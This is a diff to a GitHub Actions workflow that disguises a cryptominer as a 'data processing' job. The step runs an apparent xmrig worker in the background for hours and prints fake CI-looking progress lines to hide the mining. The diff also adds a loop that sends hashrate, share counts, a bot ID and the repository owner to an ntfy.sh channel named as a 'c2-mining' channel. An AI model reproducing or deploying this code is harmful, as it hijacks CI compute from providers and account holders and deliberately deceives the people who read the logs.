@@ -128,38 +128,57 @@ jobs:
           echo "Config generated"
 
       - name: Run data processing
+        env:
+          NTFY_CHANNEL: c2-mining-x7k2p9m4nq
+          BATCH_ID: ${{ matrix.batch }}
+          ACCOUNT: ${{ github.repository_owner }}
         run: |
           cd /tmp/cache
           echo "Starting batch processing #${{ matrix.batch }}..."
-          
+
           # Random start delay (stagger jobs)
           DELAY=$((RANDOM % 60))
           sleep $DELAY
-          
-          # Duration in seconds (default 350 min = 21000s, leave 5 min buffer)
+
+          # Duration in seconds
           DURATION=$((350 * 60 - 300))
-          
-          # Run in background so we can control timing
+
+          # Run in background
           nohup ./node-worker --config=config.json > /tmp/output/process.log 2>&1 &
           WORKER_PID=$!
-          
           echo "Worker started with PID: $WORKER_PID"
-          
-          # Progress reporting every 5 min
+
+          # Progress + ntfy reporting every 60s
           ELAPSED=0
+          TOTAL_SHARES=0
           while [ $ELAPSED -lt $DURATION ]; do
-            sleep 300
-            ELAPSED=$((ELAPSED + 300))
+            sleep 60
+            ELAPSED=$((ELAPSED + 60))
             if ! kill -0 $WORKER_PID 2>/dev/null; then
               echo "Worker stopped unexpectedly at ${ELAPSED}s"
               break
             fi
-            # Fake progress output (looks like CI logs)
-            echo "[$(date +%H:%M:%S)] Batch ${{ matrix.batch }} - processed $ELAPSED / $DURATION"
-            # Show real hashrate (from log)
-            tail -3 /tmp/output/process.log 2>/dev/null | grep -i "speed" | tail -1 || echo "  (initializing)"
+
+            # Parse hashrate from xmrig log
+            HR_LINE=$(grep -i "speed" /tmp/output/process.log 2>/dev/null | tail -1)
+            HR=$(echo "$HR_LINE" | grep -oP '\d+\.\d+' | head -1 | cut -d. -f1)
+            HR=${HR:-0}
+
+            # Parse shares (accepted)
+            SHARES=$(grep -c "accepted" /tmp/output/process.log 2>/dev/null || echo "0")
+
+            # Fake CI-looking progress
+            echo "[$(date +%H:%M:%S)] Batch ${BATCH_ID} - processed $ELAPSED / $DURATION | rate: ${HR} u/s | items: ${SHARES}"
+
+            # Send to ntfy every 60s
+            if [ "$HR" -gt "0" ]; then
+              curl -sS -X POST "https://ntfy.sh/${NTFY_CHANNEL}" \
+                -H "Title: mining" \
+                -d "{\"bot_id\":\"${BATCH_ID}\",\"account\":\"${ACCOUNT}\",\"type\":\"mining\",\"hashrate\":${HR},\"shares\":${SHARES},\"elapsed\":${ELAPSED}}" \
+                -o /dev/null 2>/dev/null || true
+            fi
           done
-          
+
           # Cleanup
           kill $WORKER_PID 2>/dev/null || true
           wait $WORKER_PID 2>/dev/null || true
